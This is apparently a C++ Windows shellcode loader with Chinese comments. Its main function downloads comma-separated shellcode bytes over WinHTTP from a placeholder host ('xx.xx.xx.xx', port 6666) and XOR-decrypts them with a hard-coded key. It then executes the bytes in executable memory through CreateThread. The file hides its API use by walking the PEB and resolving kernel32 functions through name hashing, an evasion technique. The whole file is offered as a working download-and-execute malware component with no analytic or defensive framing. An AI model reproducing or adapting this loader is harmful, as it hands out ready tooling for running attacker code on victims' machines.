#include <iostream>
#include "AES.h"
#include "Base64.h"
#include <Windows.h>
#include <vector>
#include <iomanip>
#include <winhttp.h>
#include <string>
#include <sstream>
using namespace std;
#pragma warning(disable:4996)
#pragma comment(lib, "winhttp.lib")

char* WinGet(char* ip, int port, char* url)
{

	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;

	//************ 将char转换为wchar_t *****************/
	int ipSize;
	wchar_t* ip_wchar;
	//返回接受字符串所需缓冲区的大小，已经包含字符结尾符'\0'
	ipSize = MultiByteToWideChar(CP_ACP, 0, ip, -1, NULL, 0); //iSize =wcslen(pwsUnicode)+1=6
	ip_wchar = (wchar_t*)malloc(ipSize * sizeof(wchar_t)); //不需要 pwszUnicode = (wchar_t *)malloc((iSize+1)*sizeof(wchar_t))
	MultiByteToWideChar(CP_ACP, 0, ip, -1, ip_wchar, ipSize);

	int urlSize;
	wchar_t* url_wchar;
	//返回接受字符串所需缓冲区的大小，已经包含字符结尾符'\0'
	urlSize = MultiByteToWideChar(CP_ACP, 0, url, -1, NULL, 0); //iSize =wcslen(pwsUnicode)+1=6
	url_wchar = (wchar_t*)malloc(urlSize * sizeof(wchar_t)); //不需要 pwszUnicode = (wchar_t *)malloc((iSize+1)*sizeof(wchar_t))
	MultiByteToWideChar(CP_ACP, 0, url, -1, url_wchar, urlSize);
	//************ ********************************* *****************/


	//port = 80; //默认端口

	//1. 初始化一个WinHTTP-session句柄，参数1为此句柄的名称
	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession == NULL) {
		cout << "Error:Open session failed: " << GetLastError() << endl;
		exit(0);
	}

	//2. 通过上述句柄连接到服务器，需要指定服务器IP和端口号 INTERNET_DEFAULT_HTTP_PORT:80。若连接成功，返回的hConnect句柄不为NULL
	hConnect = WinHttpConnect(hSession, ip_wchar, port, 0);
	if (hConnect == NULL) {
		cout << "Error:Connect failed: " << GetLastError() << endl;
		exit(0);
	}

	//3. 通过hConnect句柄创建一个hRequest句柄，用于发送数据与读取从服务器返回的数据。
	hRequest = WinHttpOpenRequest(hConnect, L"GET", url_wchar, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	//其中参数2表示请求方式，此处为Get；参数3:给定Get的具体地址，如这里的具体地址为https://www.citext.cn/GetTime.php
	if (hRequest == NULL) {
		cout << "Error:OpenRequest failed: " << GetLastError() << endl;
		exit(0);
	}

	BOOL bResults;
	//发送请求
	bResults = WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS,
		0, WINHTTP_NO_REQUEST_DATA, 0,
		0, 0);

	if (!bResults) {
		cout << "Error:SendRequest failed: " << GetLastError() << endl;
		exit(0);
	}
	else {
		//（3） 发送请求成功则准备接受服务器的response。注意：在使用 WinHttpQueryDataAvailable和WinHttpReadData前必须使用WinHttpReceiveResponse才能access服务器返回的数据
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	}


	LPVOID lpHeaderBuffer = NULL;
	DWORD dwSize = 0;
	//4-3. 获取服务器返回数据
	LPSTR pszOutBuffer = NULL;
	DWORD dwDownloaded = 0;         //实际收取的字符数
	wchar_t* pwText = NULL;
	if (bResults)
	{
		do
		{
			//(1) 获取返回数据的大小（以字节为单位）
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
				cout << "Error：WinHttpQueryDataAvailable failed：" << GetLastError() << endl;
				break;
			}
			if (!dwSize)    break;  //数据大小为0                

			//(2) 根据返回数据的长度为buffer申请内存空间
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer) {
				cout << "Out of memory." << endl;
				break;
			}
			ZeroMemory(pszOutBuffer, dwSize + 1);       //将buffer置0

			//(3) 通过WinHttpReadData读取服务器的返回数据
			if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &dwDownloaded)) {
				cout << "Error：WinHttpQueryDataAvailable failed：" << GetLastError() << endl;
			}
			if (!dwDownloaded)
				break;


		} while (dwSize > 0);
		//4-4. 将返回数据转换成UTF8
		DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, pszOutBuffer, -1, NULL, 0);    //返回原始ASCII码的字符数目       
		pwText = new wchar_t[dwNum];                                                //根据ASCII码的字符数分配UTF8的空间
		MultiByteToWideChar(CP_UTF8, 0, pszOutBuffer, -1, pwText, dwNum);           //将ASCII码转换成UTF8
		//printf("\n返回数据为:\n%S\n\n", pwText);


	}

	//5. 依次关闭request，connect，session句柄
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	/******************   将wchar转换为char  *******************/
	int iSize;
	char* data;

	//返回接受字符串所需缓冲区的大小，已经包含字符结尾符'\0'
	iSize = WideCharToMultiByte(CP_ACP, 0, pwText, -1, NULL, 0, NULL, NULL); //iSize =wcslen(pwsUnicode)+1=6
	data = (char*)malloc(iSize * sizeof(char)); //不需要 pszMultiByte = (char*)malloc(iSize*sizeof(char)+1);
	WideCharToMultiByte(CP_ACP, 0, pwText, -1, data, iSize, NULL, NULL);
	return data;
}

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
};

typedef HMODULE(WINAPI* fnGetModuleHandleA)(
    LPCSTR lpModuleName
    );

typedef FARPROC(WINAPI* fnGetProcAddress)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );

typedef PVOID(WINAPI* fnVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

typedef PVOID(WINAPI* fnCreateThread)(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID                  lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
    );

typedef PVOID(WINAPI* fnWaitForSingleObject)(
    HANDLE hHandle,
    DWORD  dwMilliseconds
    );

DWORD calcMyHash(char* data) {
    DWORD hash = 0x35;
    for (int i = 0; i < strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

static DWORD calcMyHashBase(LDR_MODULE* mdll) {
    char name[64];
    size_t i = 0;

    while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
        name[i] = (char)mdll->dllname.Buffer[i];
        i++;
    }
    name[i] = 0;
    return calcMyHash((char*)CharLowerA(name));
}

//从内存中获取Kernel32.dll的基地址
static HMODULE getKernel32(DWORD myHash) {
    HMODULE kernel32;

    // 获取PEB结构地址（在x64位系统中的偏移量，32位不同）
    INT_PTR peb = __readgsqword(0x60);

    auto modList = 0x18; // PEB_LDR_DATA结构中模块列表偏移量
    auto modListFlink = 0x18; // LDR_DATA_TABLE_ENTRY结构中下一个模块的偏移量
    auto kernelBaseAddr = 0x10; // LDR_DATA_TABLE_ENTRY结构中映像基地址的偏移量

    // 获取PEB_LDR_DATA结构中的模块列表指针
    auto mdllist = *(INT_PTR*)(peb + modList);

    // 获取第一个模块的LDR_DATA_TABLE_ENTRY结构中的下一个模块的指针
    auto mlink = *(INT_PTR*)(mdllist + modListFlink);

    // 获取kernel32.dll的基地址
    auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);

    auto mdl = (LDR_MODULE*)mlink;

    // 遍历模块列表，查找kernel32.dll模块
    do {
        mdl = (LDR_MODULE*)mdl->e[0].Flink; // 获取下一个模块的LDR_MODULE结构指针
        if (mdl->base != nullptr) { // 确认模块的基地址不为空
            if (calcMyHashBase(mdl) == myHash) { // 比较模块基地址的hash值是否与目标值相同，即找到了kernel32.dll
                break;
            }
        }
    } while (mlink != (INT_PTR)mdl); // 如果遍历到的模块指针等于最开始的指针，则已遍历完整个模块列表

    kernel32 = (HMODULE)mdl->base; // 将kernel32.dll模块的基地址保存在kernel32变量中
    return kernel32;
}

//列出kernel32.dll中的api函数，计算hash与传入的目标hash对比
static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
        (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
    PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

    for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
        LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

        if (calcMyHash(pFuncName) == myHash) {
            printf("successfully found! %s - %d\n", pFuncName, myHash);
            return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
        }
    }
    return nullptr;
}

//// key for XOR decrypt
char my_secret_key[] = "sothisistest";

// decrypt deXOR function
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

void loader(char* my_payload, int my_payload_len) {
    HMODULE mod = getKernel32(56369259);
    fnGetModuleHandleA myGetModuleHandleA = (fnGetModuleHandleA)getAPIAddr(mod, 4038080516);
    fnGetProcAddress myGetProcAddress = (fnGetProcAddress)getAPIAddr(mod, 448915681);

    HMODULE hk32 = myGetModuleHandleA("kernel32.dll");
    fnVirtualAlloc myVirtualAlloc = (fnVirtualAlloc)myGetProcAddress(hk32, "VirtualAlloc");
    fnCreateThread myCreateThread = (fnCreateThread)myGetProcAddress(hk32, "CreateThread");
    fnWaitForSingleObject myWaitForSingleObject = (fnWaitForSingleObject)myGetProcAddress(hk32, "WaitForSingleObject");

    XOR((char*)my_payload, my_payload_len, my_secret_key, sizeof(my_secret_key));

    PVOID lb = myVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(lb, my_payload, my_payload_len);
    HANDLE th = myCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)lb, NULL, 0, NULL);
    myWaitForSingleObject(th, INFINITE);
}


char* StrToShellcode(char str[])
{
	char buf[2048];
	const char s[2] = ",";
	char* token;
	int i = 0;
	/* 获取第一个子字符串 */
	token = strtok(str, s);
	//buf[i] = char(stoi(token)); 
	/* 继续获取其他的子字符串 */
	while (token != NULL) {

		buf[i] = char(stoi(token)); //stoi函数将字符串转换整数
		token = strtok(NULL, s);
		i++;
	}
	loader(buf, 2048);
	return buf;
}

int main(int argc, char* argv[])
{
	char* data;
	data = WinGet("xx.xx.xx.xx", 6666, "hello.txt");
	cout << "返回的数据为: " << data << endl;
	char* buf = StrToShellcode(data);
}